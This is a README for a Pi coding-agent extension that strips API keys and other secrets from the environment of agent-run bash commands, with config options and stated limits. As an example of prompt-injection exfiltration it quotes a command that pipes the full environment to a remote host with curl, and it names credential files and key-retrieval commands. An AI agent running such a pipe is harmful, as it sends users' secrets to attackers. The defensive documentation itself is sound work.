# pi-env-guard

Keeps secrets out of the commands Pi's agent runs.

Pi passes its whole environment to every `bash` command. If your shell exports `OPENAI_API_KEY`, the agent can print
it with `env`, a prompt injection can send it out with `env | curl -d @- …`, and any command output that contains it
lands in the session transcript. Pi itself and its extensions need those keys; the agent's commands mostly don't.

pi-env-guard replaces the `bash` tool with one whose child environment drops matching variables. Pi and its
extensions keep them in `process.env`. This is the same layer as Codex's `shell_environment_policy` and Claude Code's
`CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`.

## Config

`~/.pi/agent/env-guard.json`, all keys optional:

```json
{
    "hide": ["*KEY*", "*SECRET*", "*TOKEN*", "*PASSWORD*"],
    "envFiles": ["~/.pi/agent/env.op"],
    "allow": ["DATABASE_URL", "GH_TOKEN"],
    "refill": ["/bin/launchctl", "getenv", "{name}"]
}
```

| Key        | Default                                          | Meaning                                                                    |
| ---------- | ------------------------------------------------ | -------------------------------------------------------------------------- |
| `hide`     | `["*KEY*", "*SECRET*", "*TOKEN*", "*PASSWORD*"]` | Names or `*` globs dropped from agent bash.                                |
| `envFiles` | `[]`                                             | Env files (`KEY=...` lines); every key they declare is dropped too.        |
| `allow`    | `[]`                                             | Names or globs that stay, even when `hide` or `envFiles` match.            |
| `refill`   | none                                             | Command that prints a dropped key's value, with `{name}` replaced (below). |

Without a config file, the default `hide` patterns apply. Use `allow` for keys the agent's commands need on purpose:
a read-only database URL for queries, a token a CLI reads from the environment.

## Pi started from a guarded bash

Subagents and `pi -p` run as commands in the agent's bash, so they start without the dropped keys. A Pi whose model
login comes from the environment (`ANTHROPIC_OAUTH_TOKEN`, `OPENAI_API_KEY`) then has no credentials.

`refill` fixes that: when the extension loads, it runs the command for each dropped key this Pi lacks and sets the
output in `process.env`. Pi reads provider keys per request, so that is early enough. Only keys known by name can be
refilled: those from `envFiles` and exact (non-glob) `hide` entries. A failing command or empty output leaves the key
unset. Point it at a fast local cache, not a vault CLI that takes seconds:

- macOS `launchctl` session env: `["/bin/launchctl", "getenv", "{name}"]`
- macOS Keychain: `["/usr/bin/security", "find-generic-password", "-s", "pi", "-a", "{name}", "-w"]`

## What it does not cover

- Commands that read a secret store directly. With `refill` on `launchctl`, `launchctl getenv KEY` in agent bash still
  works; anything the agent's user can read, the agent can read. Closing that needs an OS boundary (sandbox, separate
  user).
- Secret files the agent reads (`.env`, `~/.aws/credentials`).
- Your own `!` commands, which keep the full environment, and processes other extensions start.
- Keys in `allow`, which the agent can read by design.

See `VISION.md` for the three layers this fits into.
